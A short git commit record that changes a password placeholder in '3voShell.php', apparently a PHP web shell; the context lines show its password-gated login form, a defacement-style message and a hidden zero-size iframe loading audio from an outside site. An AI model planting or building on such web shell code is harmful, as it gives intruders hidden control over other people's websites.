6b850d91c7c415f9b6482d5b4ceefb2ee4678eb4
alxwahid <34950902+alxwahid@users.noreply.github.com>
2019-04-18 04:00:51 +0800

    Update 3voShell.php

--- 3voShell.php
+++ 3voShell.php
@@ -222,7 +222,7 @@ If you say this is a game,we also say this is a game,can make clutter on your we
 </html>
 <center>
 <form method="post">
-<input type="password" name="pass" placeholder="PASSWORD: ******">
+<input type="password" name="pass" placeholder="PASSWORD: *******">
 </form>
 	<iframe width="0" height="0" src="https://www.anekaholiday.site/SoundCloud/ALx.mp3" frameborder="0" allowfullscreen</iframe>
 <?php 
